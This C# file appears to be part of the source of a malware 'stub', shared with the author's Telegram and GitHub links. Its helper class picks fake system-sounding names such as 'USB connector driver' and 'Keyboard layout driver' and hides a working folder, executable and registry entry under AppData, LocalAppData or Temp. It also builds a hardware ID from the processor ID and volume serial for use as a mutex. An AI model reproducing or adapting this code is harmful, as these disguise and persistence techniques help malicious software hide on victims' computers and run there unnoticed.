/* 
    Author : Megavolt
	Telegram Group : t.me/DOLFX
    Github : github.com/Megavolt666
	Telegram Author : t.me/megavoltcoder
*/
using System;
using System.IO;
using System.Management;
using System.Net;
using System.Text;
using System.Text.RegularExpressions;
using System.Windows;
using System.Xml;

namespace stubOnion
{
    class Help
    {
        // Пути
        public static readonly string DesktopPath = Environment.GetFolderPath(Environment.SpecialFolder.Desktop); // Global.DesktopPath
        public static readonly string LocalData = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData); //  Global.LocalData
        public static readonly string System = Environment.GetFolderPath(Environment.SpecialFolder.System); // Global.System
        public static readonly string AppDate = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData); // Global.AppDate
        public static readonly string CommonData = Environment.GetFolderPath(Environment.SpecialFolder.CommonApplicationData); // Global.CommonData
        public static readonly string MyDocuments = Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments); // Global.MyDocuments
        public static readonly string UserProfile = Environment.GetFolderPath(Environment.SpecialFolder.UserProfile); // Global.UserProfile

        // Выбираем рандомное рабочее имя
        public static string[] Name = new string[]
    {
                "Driver package", "API Infrastructure", "Host management", "Keyboard layout driver",
                 "System language indicator", "Infrastructure protection", "Graphics Reconstructor", "User Media",
                  "Internet controller driver", "Support Center Node", "Api mouse check", "Graphics Status Indicator",
                   "USB connector driver", "Lifecycle provider", "Checking sound status", "GitHub API Checker"
    };

        public static string RandomName = Name[new Random().Next(0, Name.Length)];

        // Выбираем рандомную системную папку
        public static string[] SysPatch = new string[]
    {
                LocalData, AppDate, Path.GetTempPath()
    };
        public static string RandomSysPatch = SysPatch[new Random().Next(0, SysPatch.Length)];

        // Рандомная папка
        public static string WorkingDir = RandomSysPatch + "\\" + RandomName + " v" + GenString.GeneNumbers() + "." + GenString.GeneNumbersTo();

        // Название в реестре
        public static string NameRegRandom = RandomName + " v" + GenString.GeneNumbers() + "." + GenString.GeneNumbersTo();

        // Название рабочего файла
        public static string BinName = "\\" + RandomName;

        // Название рабочего файла с удалением в нем пробелов
        public static string SpaceDel = Regex.Replace(BinName, @"\s+", "");

        public static string bin = SpaceDel + ".exe";
        // Мутекс берем из сгенерированного HWID
        public static string Mut = HWID;

        // Генерим уникальный HWID
        public static string HWID = GetProcessorID() + GetHwid();

        // Получаем VolumeSerialNumber
        public static string GetHwid()
        {
            string hwid = "";
            try
            {
                string drive = Environment.GetFolderPath(Environment.SpecialFolder.System).Substring(0, 1);
                ManagementObject disk = new ManagementObject("win32_logicaldisk.deviceid=\"" + drive + ":\"");
                disk.Get();
                string diskLetter = (disk["VolumeSerialNumber"].ToString());
                hwid = diskLetter;
            }
            catch
            { }
            return hwid;
        }
        // Получаем Processor Id
        public static string GetProcessorID()
        {
            string sProcessorID = "";
            string sQuery = "SELECT ProcessorId FROM Win32_Processor";
            ManagementObjectSearcher oManagementObjectSearcher = new ManagementObjectSearcher(sQuery);
            ManagementObjectCollection oCollection = oManagementObjectSearcher.Get();
            foreach (ManagementObject oManagementObject in oCollection)
            {
                sProcessorID = (string)oManagementObject["ProcessorId"];
            }

            return (sProcessorID);
        }
    }
}
